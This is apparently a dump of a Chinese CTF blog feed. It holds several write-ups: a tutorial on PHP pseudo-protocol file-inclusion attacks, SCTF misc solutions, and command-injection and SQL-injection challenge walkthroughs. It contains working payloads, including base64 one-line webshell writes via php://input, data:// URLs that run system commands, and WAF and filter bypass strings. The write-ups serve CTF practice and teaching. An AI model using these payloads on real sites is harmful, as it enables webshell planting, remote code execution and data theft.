function_ invoke__">header</span>(<span class="string">&quot;Content-type: text/html; charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;flag 在flag.php中&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;传入一个file试试&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span> flag 在flag.php中</span><br></pre></td></tr></table></figure><p>发现有include_once函数；<br>include_once()：在脚本执行期间包含并运行指定文件。该函数和include 函数类似，两者唯一的区别是 使用该函数的时候，php会加检查指定文件是否已经被包含过，如果是，则不会再被包含。</p><p>于是利用伪协议构造，</p><p>php://filter/convert.base64-encode/resource=flag.php</p><p>得到经过Base64加密的flag，解密即可。</p><h2 id="常见的php伪协议"><a href="#常见的php伪协议" class="headerlink" title="常见的php伪协议"></a>常见的php伪协议</h2><p>1）file:// 访问本地文件系统</p><p>2）http:// 访问HTTP(S)网址</p><p>3）ftp:// 访问FTP(S)URL</p><p>4)php:// 访问各个输出输入流</p><p>5)zlib:// 处理压缩流</p><p>6)data:// 读取数据</p><p>7)glob:// 查找匹配的文件路径模式</p><p>8)phar:// PHP归档</p><p>9)rar:// RAR数据压缩</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/QQ%E5%9B%BE%E7%89%8720240915150327.png" alt=""></p><h2 id="协议详细："><a href="#协议详细：" class="headerlink" title="协议详细："></a>协议详细：</h2><p>一、环境概要：<br>PHP伪协议指的是PHP所支持的协议与封装协议，在web渗透漏洞利用中常用于配合文件包含进行web攻击，从而获取网站权限。</p><p>1.php.ini配置文件参数：</p><p>allow_url_fopen ：on #默认开启 ，表示允许url里的封装协议访问文件；<br>allow_url_include：off #默认关闭，表示不允许包含url里的封装协议包含文件；<br>2.常用伪协议条件及方法</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/e5f2a0a7a079c20ae6af01a5753bdd82.png" alt="在这里插入图片描述"></p><p>3.注意点</p><p>①各个伪协议适用php版本不尽相同，以下php版本在5.2~5.7之间疯狂来回切换，到最后已经无法总结各协议实验成功所使用的php版本。总之：php&gt;5.2.0<br>②以下所有实例均使用Firefox浏览器</p><p>二、伪协议实例</p><h4 id="1-php-input"><a href="#1-php-input" class="headerlink" title="1.php://input"></a>1.php://input</h4><p>php://input 是可以访问请求原始数据的只读流。在POST 请求的情况下，由于 php://input 不依赖于特定的 php.ini 指令，可以使用它代替 $HTTP_RAW_POST_DATA。</p><p>php://input   (执行post中的命令)</p><p>注意点<br>①input必须以post请求<br>②enctype=“multipart/form-data” 的时候 php://input 是无效的<br>③allow_url_include=on</p><p>实例一：php://input将文件包含漏洞变成代码执行漏洞</p><p>①目标网站存在包含漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>②使用php://input，将执行代码通过在POST data中提交</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;ipconfig&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/e5f2a0a7a079c20ae6af01a5753bdd82.png" alt=""></p><p>实例二：php://input利用文件包含写入shell</p><p>①目标网站存在包含漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>②使用php://input，将执行代码通过在POST data中提交</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#post方式提交</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;test.php&quot;</span>,<span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;PD9waHAgZXZhbCgkX1BPU1RbJ2NjJ10pPz4=&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>执行成功会在当前目录下生成一句话shell，可直接连接</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/075dbc6a76924f750b80ef7bcd0a8964.png" alt="在这里插入图片描述"></p><p>实例三：php://input协议直接写入shell</p><p>①含有php://input的代码漏洞文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>); </span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$data</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>POST直接传参执行php代码：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/b14c8e1c01df529a99ef1a94150ba4f7.png" alt="在这里插入图片描述">同理，这里在post数据提交生成shell的代码，会在同级目录下生成shell：</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo file_put_contents(<span class="string">&quot;ceshi.php&quot;</span>,base64_decode(<span class="string">&quot;PD9waHAgZXZhbCgkX1BPU1RbJ2NjJ10pPz4=&quot;</span>))<span class="comment">;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/ab163614fd0d637a0c968b0d80ba168c.png" alt="在这里插入图片描述"></p><p>需要注意的是，此方法使用条件为：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>.allow_url_include = <span class="literal">On</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">2</span>. PHP &gt;= <span class="number">5</span>.<span class="number">2</span>.<span class="number">0</span></span><br><span class="line"><span class="attribute">3</span>. 当前文件有写入权限</span><br></pre></td></tr></table></figure><h4 id="2-data-URL代码执行"><a href="#2-data-URL代码执行" class="headerlink" title="2.data:URL代码执行"></a>2.data:URL代码执行</h4><p>将攻击代码转换为data:URL形式进行攻击，以传递相应格式的数据用来执行PHP代码。为了防止直接在URL连接中的一些敏感字符被waf检测拦截，可将攻击代码进行base64编码。</p><h1 id="文件包含代码："><a href="#文件包含代码：" class="headerlink" title="文件包含代码："></a>文件包含代码：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]<span class="meta">?&gt;</span>   </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>访问执行：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">127.0.0.1</span>/<span class="number">1</span>.php?file=data:text/plain;base64,PD9waHAKcGhwaW5mbygpOwo/Pg==</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/0d8db3c74cf4384ce95fee2a92a3286a.png" alt=""></p><p>条件：allow_url_include = on&amp;allow_url_fopen()=on&amp; PHP &gt;= 5.2.0</p><h4 id="3-php-filter读取源代码"><a href="#3-php-filter读取源代码" class="headerlink" title="3.php://filter读取源代码"></a>3.php://filter读取源代码</h4><p>php://filter用于读取网站源码。读取php文件源码内容(直接包含脚本格式文件会解析无法直接获取文件源码)。用法：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.1</span><span class="number">.3</span>/<span class="number">1.</span>php?<span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=<span class="number">1.</span>php</span><br></pre></td></tr></table></figure><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/<span class="built_in">read</span>=<span class="built_in">convert</span>.<span class="built_in">base64</span>-encode/resource=/<span class="built_in">var</span>/www/html/flag.php(使用<span class="built_in">base64</span>读取源文件)</span><br></pre></td></tr></table></figure><blockquote><p>有时题目会需要我们必须包含某个字符串<br>技巧是php://filter伪协议可以套一层协议<br>比如我们需要包含woofers这个字符串：php://filter/read=convert.base64-encode/woofers/resource=index</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/81ffdc55f82671f8dcb54cf09e267f66.png" alt="在这里插入图片描述"></p><h4 id="4-file-物理路径包含文件"><a href="#4-file-物理路径包含文件" class="headerlink" title="4.file://物理路径包含文件"></a>4.file://物理路径包含文件</h4><p>file:// 协议在allow_url_fopen,allow_url_include都为off的情况下也可以正常使用：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.3/1.php?filename=file:///C:<span class="symbol">\\</span>phpStudy<span class="symbol">\\</span>WWW<span class="symbol">\\</span>fileinclude<span class="symbol">\\</span>2<span class="symbol">\\</span>1.txt</span><br></pre></td></tr></table></figure><p>file://机器的IP地址/目录/文件（这个后面不一定需要跟文件，如果只写一个目录的话就是查看该目录下有哪些文件）<br>对于本地机器，机器的IP地址变成127.0.0.1或localhost或干脆什么也不写。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/106b1e158dda18f56b78e9000c5b0dcc.png" alt="在这里插入图片描述"></p><h4 id="5-data-：利用文件包含-amp-data-可进行命令执行"><a href="#5-data-：利用文件包含-amp-data-可进行命令执行" class="headerlink" title="5.data://：利用文件包含&amp;data://可进行命令执行"></a>5.data://：利用文件包含&amp;data://可进行命令执行</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">192.168.1.3</span>/<span class="number">1</span>.php?filename=data://text/plain,%<span class="number">3</span>C?php%<span class="number">20</span>system(%<span class="number">27</span>whoami%<span class="number">27</span>);?%<span class="number">3</span>E</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/42786ed141197be7c7152764d03fb81d.png" alt="在这里插入图片描述"></p><p>data协议就是会把后面的一段字符串当成php代码区执行，所以读取flag.php的文件就可以看到flag了</p><p>例如：</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">?c=data://text/plain,</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;tac flag.php&quot;</span>);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>php://data/plain;base64,XXXX（base64编码后的数据）</p><p>data:text/plain,XXX</p><p>可能的编码的问题：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在编成base64的时候出现了+。而浏览器不认识+号。所以解决方法：</p><p>1.不写后面的?&gt; 因为PHP里面其实不需要写后面的 前面的；号就已经说明结束了。如果没有；号就必须写?&gt;作为结束。<br>2.添加空格改变base64编码。<br>3.将+号换成%2b<br><strong>其实不需要通过base64编码来实现！！！</strong><br><strong>将</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>改变成url编码。这样浏览器可以识别！</strong></p><h4 id="6-zip-绕过文件包含下的附加后缀"><a href="#6-zip-绕过文件包含下的附加后缀" class="headerlink" title="6.zip://绕过文件包含下的附加后缀"></a>6.zip://绕过文件包含下的附加后缀</h4><p>以下两串代码是对文件后缀进行验证或修改然后再进行包含。对于此类情况，如果要包含非预定文件后缀的文件，可以通过%00截断进行绕过。但是%00截断在php版本5.3.4之后就失效了，而且还要考虑GPC，限制比较严重。除此之外，可以通过zip协议和phar协议来包含文件，突破附加后缀限制。</p><p>验证包含对象文件后缀是否为jpg，如果是才进行包含</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$file</span>, -<span class="number">4</span>)) == <span class="string">&quot;.jpg&quot;</span>)&#123;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="直接为包含对象添加jpg后缀，然后进行包含"><a href="#直接为包含对象添加jpg后缀，然后进行包含" class="headerlink" title="直接为包含对象添加jpg后缀，然后进行包含"></a>直接为包含对象添加jpg后缀，然后进行包含</h1><p>&lt;?php<br>$file = $_GET[‘file’];<br>include($file.’.jpg’);<br>?&gt;</p><h2 id="绕过方法："><a href="#绕过方法：" class="headerlink" title="绕过方法："></a>绕过方法：</h2><p>绕过方法：<br>①实战情况下往目标站点上传zip文件，里面压缩着一个jpg格式的php脚本。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/46fab7eacc6b0f867e3e07462fc016e1.png" alt="在这里插入图片描述"></p><p>②构造zip://php.zip#php.jpg，进行zip://伪协议绕过后缀名限制。这里将压缩文件里面的内容修改为在当前目录下生成一句话即可getshell。</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/<span class="built_in">file</span>.php?<span class="built_in">file</span>=zip://php.zip%<span class="number">23</span>php.jpg</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/7105d73de0cdab6f3d9e995d3e87c295.png" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SCTF-2024-wp</title>
      <link href="/posts/9f5e663d.html"/>
      <url>/posts/9f5e663d.html</url>
      
        <content type="html"><![CDATA[<h1 id="SCTF-2024-wp"><a href="#SCTF-2024-wp" class="headerlink" title="SCTF-2024-wp"></a>SCTF-2024-wp</h1><h4 id="FixIt"><a href="#FixIt" class="headerlink" title="FixIt"></a>FixIt</h4><blockquote><p>考点：css代码</p><p>附件之中是一串css代码，编写html代码运行即可</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241020230911858.png" alt="image-20241020230911858"></p><blockquote><p>这里发个模板，填充即可</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Pixel<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.pixel-wrap</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">170px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">170px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.pixel</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">1px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">1px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">0%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">box-shadow</span>:</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.pixel-wrap</span><span class="selector-pseudo">:hover</span> <span class="selector-class">.pixel</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="comment">/* ... 悬停时的样式 ... */</span></span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;pixel-wrap&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;pixel&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>网页之中用光标点一下有图案的地方就会出现二维码，扫一下就出来了。</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241020231524486.png" alt="image-20241020231524486"></p><h4 id="music-Master"><a href="#music-Master" class="headerlink" title="music Master"></a>music Master</h4><blockquote><p>碎碎念：这道题死磕也没刻出来</p><p>首先下载附件是一个mkv文件，用Potplayer播放，发现两个音轨和两个视频轨。</p><p>先看音轨</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241020233803654.png" alt="image-20241020233803654"></p><blockquote><p>对音轨左右声道分别进行SSTV解码，得到两张残缺的二维码</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241020234040355.png" alt="image-20241020234040355"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241020234006589.png" alt="image-20241020234006589"></p><blockquote><p>对第一个二维码扫码，发现是 this is not flag，而第二张不完整，中间定位点正好全没了，故猜测是两张图进行异或操作。将两张图放入PS，图层混合类型选择差值，并将图片反相，即可得到新的码</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241021000118649.png" alt="image-20241021000118649"></p><blockquote><p>ps手工修图后扫码</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241020234921960.png" alt="image-20241020234921960"></p><blockquote><p>得到一串密码，刚开始不知道是什么，先放在一边</p><p>再看两个视频轨</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241020233246189.png" alt="image-20241020233246189"></p><blockquote><p>这是cimbar编码，使用安卓工具 解码 APP：<a href="https://github.com/sz3/cfc/releases/，扫描后得到一个有密码的">https://github.com/sz3/cfc/releases/，扫描后得到一个有密码的</a> 7z 压缩。而密码就是上面得到的。</p><p>但是很遗憾，我扫码出来后并没有得到zip文件，且无法提取出zip文件，因此不得不放弃了。wp中显示解压缩后用OpenMPT打开，在进行一系列操作可以得到一串base64编码，解码就是flag。</p><p>这里放上官方wp链接：<a href="https://quick-mascara-699.notion.site/2024SCTF-wp-d34600322f1141e680e837abce5795ef?pvs=74">https://quick-mascara-699.notion.site/2024SCTF-wp-d34600322f1141e680e837abce5795ef?pvs=74</a></p><p>最后想评价一下这次SCTF,难度是真的大，不是我这种菜鸡能接触的，索性跑路。[流泪]</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题2024.10.19</title>
      <link href="/posts/c299aaba.html"/>
      <url>/posts/c299aaba.html</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h4 id="MoeCTF-2021-babyRCE"><a href="#MoeCTF-2021-babyRCE" class="headerlink" title="[MoeCTF 2021]babyRCE"></a>[MoeCTF 2021]babyRCE</h4><blockquote><p>考点：关键词过滤</p><p>来源：nssctf</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$rce</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;rce&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$rce</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\;|[0-9]|\*|\`|\%|\&gt;|\&lt;|\&#x27;|\&quot;/i&quot;</span>, <span class="variable">$rce</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$rce</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hhhhhhacker!!!&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><blockquote><p>先用ls查看</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019170841483.png" alt="image-20241019170841483"></p><blockquote><p>构造payload：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">?r</span>ce=ca\t<span class="variable">$&#123;</span><span class="variable constant_">IFS</span>&#125;fl\ag.php</span><br></pre></td></tr></table></figure></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019170919138.png" alt="image-20241019170919138"></p><p><strong>注意：1.有时候使用cat会一片空白，需要查看源码</strong></p><p>​             <strong>2.允许的条件下，可以先用ls，再用cat</strong></p><h4 id="command-execution"><a href="#command-execution" class="headerlink" title="command_execution"></a>command_execution</h4><blockquote><p>考点：命令执行</p><p>来源：攻防世界</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019182142415.png" alt="image-20241019182142415"></p><blockquote><p>先ping一下127.0.0.1</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019182650673.png" alt="image-20241019182650673"></p><blockquote><p>再用;来连接两个命令  127.0.0.1;ls</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019182844520.png" alt="image-20241019182844520"></p><blockquote><p>试试看能不能查看inddex.php</p><p>127.0.0.1;cat index.php</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019183259450.png" alt="image-20241019183259450"></p><blockquote><p>很明显，不行，那就退级看看</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019183409397.png" alt="image-20241019183409397"></p><blockquote><p>在home中发现flag。</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019183459124.png" alt="image-20241019183459124"></p><blockquote><p>查看flag</p><p>127.0.0.1;cat ../../../home/flag.txt</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019173221179.png" alt="image-20241019173221179"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">cyberpeace</span><span class="template-variable">&#123;ac541782e73fa1da4a98ec4bc3449fb1&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SHCTF-2024-week2-wp</title>
      <link href="/posts/8843d8f6.html"/>
      <url>/posts/8843d8f6.html</url>
      
        <content type="html"><![CDATA[<h1 id="SHCTF-2024-week2-wp"><a href="#SHCTF-2024-week2-wp" class="headerlink" title="SHCTF-2024-week2-wp"></a>SHCTF-2024-week2-wp</h1><p>[TOC]</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h4 id="Week2-自助查询"><a href="#Week2-自助查询" class="headerlink" title="[Week2]自助查询"></a>[Week2]自助查询</h4><blockquote><p>考点：sql注入</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019091938307.png" alt="image-20241019091938307"></p><blockquote><p>看到查询语句,直接sql注入</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019092125629.png" alt="image-20241019092125629"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019092142856.png" alt="image-20241019092142856"></p><blockquote><p>说明只有两列</p><p>查看当前数据库</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019092232840.png" alt="image-20241019092232840"></p><blockquote><p>查看’ctf’数据库下面的表</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019092320620.png" alt="image-20241019092320620"></p><blockquote><p>查看’flag’下的字段</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019092356472.png" alt="image-20241019092356472"></p><blockquote><p>查看’scretddata’的内容</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019092506720.png" alt="image-20241019092506720"></p><blockquote><p>根据提示，说明在注释里面</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019092616808.png" alt="image-20241019092616808"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019092556163.png" alt="image-20241019092556163"></p><blockquote><p>找到flag</p><p>SHCTF{5elf_s3RvICe_SEARch_334c747eabdf}</p></blockquote><h4 id="Week2-登录验证"><a href="#Week2-登录验证" 